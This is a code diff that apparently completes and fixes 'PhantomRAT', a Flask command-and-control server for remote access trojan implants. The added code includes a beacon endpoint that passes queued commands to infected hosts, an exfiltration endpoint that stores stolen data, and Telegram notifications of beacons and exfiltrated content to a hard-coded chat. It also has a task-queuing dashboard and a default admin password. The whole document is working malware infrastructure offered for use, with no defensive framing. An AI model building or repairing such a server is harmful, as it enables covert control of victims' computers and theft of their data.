@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PhantomRAT C2 Server v4.0
+PhantomRAT C2 Server v4.0 - Fixed Version
 Enhanced dashboard with animated rat visualization and modern UI.
 """
 
@@ -39,6 +39,47 @@ CHAT_ID = '7279310150'
 # Color scheme for PhantomRat
 RAT_COLORS = ['#1a1a2e', '#16213e', '#0f3460', '#e94560']
 ANIMATION_STATES = ['idle', 'running', 'sneaking', 'attacking']
+
+# ============= FIX: ADD MISSING DECORATOR =============
+def login_required(f):
+    """Decorator to require login for routes"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'user_id' not in session:
+            return redirect(url_for('login_page'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+# ============= FIX: ADD MISSING HELPER FUNCTIONS =============
+def check_password_hash(stored_hash, password):
+    """Check if password matches stored hash"""
+    return hashlib.sha256(password.encode()).hexdigest() == stored_hash
+
+def encrypt_data(data):
+    """Encrypt data for transmission"""
+    try:
+        return CIPHER.encrypt(json.dumps(data).encode())
+    except:
+        return b''
+
+def decrypt_data(encrypted_data):
+    """Decrypt received data"""
+    try:
+        return json.loads(CIPHER.decrypt(encrypted_data).decode())
+    except:
+        return None
+
+def send_telegram(message):
+    """Send notification to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": CHAT_ID,
+            "text": message
+        }
+        requests.post(url, json=data, timeout=5)
+    except:
+        pass
 
 class RatAnimation:
     """Rat animation generator for dashboard visualization"""
@@ -212,21 +253,21 @@ class RatAnimation:
     def generate_rat_card(implant_data):
         """Generate HTML card with animated rat for each implant"""
         states = ['idle', 'running', 'sneaking']
-        state = random.choice(states) if implant_data['status'] == 'active' else 'idle'
+        state = random.choice(states) if implant_data.get('status') == 'active' else 'idle'
         color = random.choice(RAT_COLORS[:3])
         
         return f'''
-        <div class="rat-card" data-implant-id="{implant_data['id']}">
+        <div class="rat-card" data-implant-id="{implant_data.get('id', 'unknown')}">
             <div class="rat-animation">
                 {RatAnimation.generate_svg_rat(state, color)}
             </div>
             <div class="rat-info">
-                <h4>👻 {implant_data['hostname'][:15] or implant_data['id'][:8]}</h4>
-                <p><strong>OS:</strong> {implant_data['os']}</p>
-                <p><strong>IP:</strong> {implant_data['ip']}</p>
-                <p><strong>Last Seen:</strong> <span class="time-ago" data-time="{implant_data['last_seen']}"></span></p>
-                <span class="status-badge {'status-active' if implant_data['status'] == 'active' else 'status-inactive'}">
-                    {implant_data['status'].upper()}
+                <h4>👻 {implant_data.get('hostname', 'Unknown')[:15] or implant_data.get('id', 'unknown')[:8]}</h4>
+                <p><strong>OS:</strong> {implant_data.get('os', 'Unknown')}</p>
+                <p><strong>IP:</strong> {implant_data.get('ip', 'Unknown')}</p>
+                <p><strong>Last Seen:</strong> <span class="time-ago" data-time="{implant_data.get('last_seen', 0)}"></span></p>
+                <span class="status-badge {'status-active' if implant_data.get('status') == 'active' else 'status-inactive'}">
+                    {implant_data.get('status', 'inactive').upper()}
                 </span>
             </div>
         </div>
@@ -248,10 +289,54 @@ def close_db(error):
 def init_db():
     with app.app_context():
         db = get_db()
-        # ... (same database initialization code) ...
+        
+        # Create implants table
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS implants (
+                id TEXT PRIMARY KEY,
+                os TEXT,
+                hostname TEXT,
+                ip TEXT,
+                last_seen REAL,
+                status TEXT DEFAULT 'inactive',
+                first_seen REAL DEFAULT (strftime('%s', 'now'))
+            )
+        ''')
+        
+        # Create tasks table
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS tasks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                implant_id TEXT,
+                command TEXT,
+                arguments TEXT,
+                status TEXT DEFAULT 'pending',
+                created_at REAL DEFAULT (strftime('%s', 'now')),
+                delivered_at REAL,
+                completed_at REAL,
+                result TEXT,
+                FOREIGN KEY (implant_id) REFERENCES implants (id)
+            )
+        ''')
+        
+        # Create users table
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS users (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT UNIQUE,
+                password_hash TEXT
+            )
+        ''')
+        
+        # Add default admin user if not exists
+        existing = db.execute('SELECT COUNT(*) as count FROM users WHERE username = ?', ('admin',)).fetchone()
+        if existing['count'] == 0:
+            password_hash = hashlib.sha256('phantomrat'.encode()).hexdigest()
+            db.execute('INSERT INTO users (username, password_hash) VALUES (?, ?)', 
+                      ('admin', password_hash))
+        
         db.commit()
-
-# ... (authentication and encryption functions remain the same) ...
+        print("[+] Database initialized successfully")
 
 @app.route('/')
 @login_required
@@ -259,6 +344,7 @@ def dashboard():
     db = get_db()
     implants = db.execute('SELECT * FROM implants ORDER BY last_seen DESC').fetchall()
     tasks = db.execute('SELECT * FROM tasks ORDER BY created_at DESC LIMIT 10').fetchall()
+    
     active_count = db.execute('SELECT COUNT(*) FROM implants WHERE status = ?', ('active',)).fetchone()[0]
     pending_count = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('pending',)).fetchone()[0]
     completed_count = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('completed',)).fetchone()[0]
@@ -591,7 +677,7 @@ def dashboard():
         
         <h2 style="margin: 30px 0 15px 0; color: var(--accent-red);">👥 Active PhantomRats</h2>
         <div class="implants-grid">
-            {rat_cards}
+            {rat_cards if rat_cards else '<p style="grid-column: 1 / -1; text-align: center; color: var(--text-muted);">No implants connected yet...</p>'}
         </div>
         
         <h2 style="margin: 30px 0 15px 0; color: var(--accent-blue);">📋 Recent Tasks</h2>
@@ -607,7 +693,7 @@ def dashboard():
                     </tr>
                 </thead>
                 <tbody>
-                    {"".join(f'<tr><td>#{t["id"]}</td><td>{t["implant_id"][:8]}...</td><td><code>{t["command"]}</code></td><td><span class="status-badge status-{t["status"]}">{t["status"].upper()}</span></td><td>{datetime.fromtimestamp(t["created_at"]).strftime("%H:%M:%S")}</td></tr>' for t in tasks)}
+                    {"".join(f'<tr><td>#{t["id"]}</td><td>{t["implant_id"][:8] if t["implant_id"] else "N/A"}...</td><td><code>{t["command"]}</code></td><td><span class="status-badge status-{t["status"]}">{t["status"].upper()}</span></td><td>{datetime.fromtimestamp(t["created_at"]).strftime("%H:%M:%S") if t["created_at"] else "N/A"}</td></tr>' for t in tasks) if tasks else '<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">No tasks yet...</td></tr>'}
                 </tbody>
             </table>
         </div>
@@ -620,7 +706,7 @@ def dashboard():
                         <label for="implant_id">Target Rat ID:</label>
                         <select name="implant_id" id="implant_id" required>
                             <option value="">Select a rat...</option>
-                            {"".join(f'<option value="{i["id"]}">{i["hostname"]} ({i["id"][:8]})</option>' for i in implants)}
+                            {"".join(f'<option value="{i["id"]}">{i["hostname"] or i["id"][:8]} ({i["id"][:8]})</option>' for i in implants)}
                         </select>
                     </div>
                     <div>
@@ -645,6 +731,11 @@ def dashboard():
             function updateTimeAgo() {{
                 document.querySelectorAll('.time-ago').forEach(el => {{
                     const timestamp = parseInt(el.dataset.time);
+                    if (!timestamp) {{
+                        el.textContent = 'never';
+                        return;
+                    }}
+                    
                     const diff = Math.floor((Date.now() / 1000) - timestamp);
                     
                     if (diff < 60) {{
@@ -670,37 +761,53 @@ def dashboard():
             
             // Auto-refresh every 30 seconds
             setInterval(() => {{
-                fetch('/api/stats')
-                    .then(response => response.json())
-                    .then(data => {{
-                        // Update stats cards
-                        document.querySelectorAll('.stat-number')[0].textContent = data.active_implants;
-                        // Can add more dynamic updates here
-                    }});
-                updateTimeAgo();
+                location.reload();
             }}, 30000);
             
             // Initial time update
             updateTimeAgo();
             
             // Form submission feedback
-            document.getElementById('taskForm').addEventListener('submit', function(e) {{
-                const button = this.querySelector('button[type="submit"]');
-                const originalText = button.textContent;
-                button.textContent = '🚀 Deploying...';
-                button.disabled = true;
-                
-                setTimeout(() => {{
-                    button.textContent = originalText;
-                    button.disabled = false;
-                }}, 2000);
-            }});
+            const taskForm = document.getElementById('taskForm');
+            if (taskForm) {{
+                taskForm.addEventListener('submit', function(e) {{
+                    e.preventDefault();
+                    const button = this.querySelector('button[type="submit"]');
+                    const originalText = button.textContent;
+                    button.textContent = '🚀 Deploying...';
+                    button.disabled = true;
+                    
+                    // Submit form
+                    fetch(this.action, {{
+                        method: 'POST',
+                        body: new FormData(this)
+                    }}).then(response => {{
+                        if (response.ok) {{
+                            button.textContent = '✅ Deployed!';
+                            setTimeout(() => location.reload(), 1000);
+                        }} else {{
+                            button.textContent = '❌ Failed';
+                            setTimeout(() => {{
+                                button.textContent = originalText;
+                                button.disabled = false;
+                            }}, 2000);
+                        }}
+                    }}).catch(() => {{
+                        button.textContent = '❌ Error';
+                        setTimeout(() => {{
+                            button.textContent = originalText;
+                            button.disabled = false;
+                        }}, 2000);
+                    }});
+                }});
+            }}
             
             // Add keyboard shortcut
             document.addEventListener('keydown', (e) => {{
                 if (e.ctrlKey && e.key === 'k') {{
                     e.preventDefault();
-                    document.getElementById('cmd').focus();
+                    const cmdInput = document.getElementById('cmd');
+                    if (cmdInput) cmdInput.focus();
                 }}
             }});
         </script>
@@ -919,7 +1026,27 @@ def login_page():
     '''
     return html
 
-# ... (rest of the routes remain the same with minor tweaks) ...
+@app.route('/logout')
+def logout():
+    session.pop('user_id', None)
+    return redirect(url_for('login_page'))
+
+@app.route('/upload_task', methods=['POST'])
+@login_required
+def upload_task():
+    implant_id = request.form.get('implant_id')
+    command = request.form.get('cmd')
+    
+    if not implant_id or not command:
+        return redirect(url_for('dashboard'))
+    
+    db = get_db()
+    db.execute('INSERT INTO tasks (implant_id, command, status) VALUES (?, ?, ?)',
+              (implant_id, command, 'pending'))
+    db.commit()
+    
+    send_telegram(f"📝 New task created: {command} for implant {implant_id[:8]}")
+    return redirect(url_for('dashboard'))
 
 @app.route('/phantom/beacon', methods=['POST'])
 def beacon():
@@ -931,17 +1058,28 @@ def beacon():
         if not data:
             return '', 400
         
-        implant_id = data['id']
+        implant_id = data.get('id')
+        if not implant_id:
+            return '', 400
+        
         db = get_db()
         
         # Update or insert implant
         db.execute('''
             INSERT OR REPLACE INTO implants (id, os, hostname, ip, last_seen, status)
             VALUES (?, ?, ?, ?, ?, ?)
-        ''', (implant_id, data.get('os'), data.get('hostname'), data.get('ip'), time.time(), 'active'))
+        ''', (
+            implant_id, 
+            data.get('os', 'Unknown'), 
+            data.get('hostname', 'Unknown'), 
+            data.get('ip', 'Unknown'), 
+            time.time(), 
+            'active'
+        ))
         
         # Get pending tasks
-        tasks = db.execute('SELECT * FROM tasks WHERE implant_id = ? AND status = ?', (implant_id, 'pending')).fetchall()
+        tasks = db.execute('SELECT * FROM tasks WHERE implant_id = ? AND status = ?', 
+                          (implant_id, 'pending')).fetchall()
         task_list = []
         for task in tasks:
             task_list.append({
@@ -949,12 +1087,16 @@ def beacon():
                 'command': task['command'],
                 'arguments': task['arguments']
             })
-            db.execute('UPDATE tasks SET status = ?, delivered_at = ? WHERE id = ?', ('delivered', time.time(), task['id']))
+            db.execute('UPDATE tasks SET status = ?, delivered_at = ? WHERE id = ?', 
+                      ('delivered', time.time(), task['id']))
         
         db.commit()
-        send_telegram(f"🔄 Beacon from {implant_id}")
+        send_telegram(f"🔄 Beacon from {implant_id[:8]}")
+        
+        # Return encrypted task list
         return encrypt_data(task_list)
-    except:
+    except Exception as e:
+        print(f"[!] Beacon error: {e}")
         return '', 400
 
 @app.route('/phantom/exfil', methods=['POST'])
@@ -967,8 +1109,8 @@ def exfil():
         if not data:
             return '', 400
         
-        implant_id = data['id']
-        exfil_data = data['data']
+        implant_id = data.get('id')
+        exfil_data = data.get('data')
         
         db = get_db()
         # Update task result if it's a response
@@ -977,12 +1119,29 @@ def exfil():
                       ('completed', time.time(), json.dumps(exfil_data), data['task_id']))
         
         db.commit()
-        send_telegram(f"📤 Exfil from {implant_id}: {json.dumps(exfil_data)[:100]}...")
+        send_telegram(f"📤 Exfil from {implant_id[:8] if implant_id else 'unknown'}: {json.dumps(exfil_data)[:100]}...")
         return '', 200
-    except:
+    except Exception as e:
+        print(f"[!] Exfil error: {e}")
         return '', 400
 
-# ... (remaining API routes) ...
+@app.route('/api/stats')
+@login_required
+def api_stats():
+    db = get_db()
+    active_count = db.execute('SELECT COUNT(*) FROM implants WHERE status = ?', ('active',)).fetchone()[0]
+    total_count = db.execute('SELECT COUNT(*) FROM implants').fetchone()[0]
+    pending_count = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('pending',)).fetchone()[0]
+    
+    return jsonify({
+        'active_implants': active_count,
+        'total_implants': total_count,
+        'pending_tasks': pending_count,
+        'uptime': int(time.time() - app_start_time)
+    })
+
+# Global variable to track app start time
+app_start_time = time.time()
 
 if __name__ == '__main__':
     import argparse
@@ -990,10 +1149,17 @@ if __name__ == '__main__':
     parser.add_argument('--host', '-i', default='0.0.0.0', help='Host to bind to')
     parser.add_argument('--port', '-p', type=int, default=5000, help='Port to listen on')
     parser.add_argument('--init', action='store_true', help='Initialize database')
+    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
     
     args = parser.parse_args()
     
     if args.init:
         init_db()
-    else:
-        app.run(host=args.host, port=args.port, debug=False)
+        print("[+] Database initialized. Starting server...")
+    
+    print(f"[+] PhantomRAT C2 Server v4.0")
+    print(f"[+] Starting on {args.host}:{args.port}")
+    print(f"[+] Dashboard: http://{args.host if args.host != '0.0.0.0' else '127.0.0.1'}:{args.port}")
+    print(f"[+] Default login: admin / phantomrat")
+    
+    app.run(host=args.host, port=args.port, debug=args.debug)
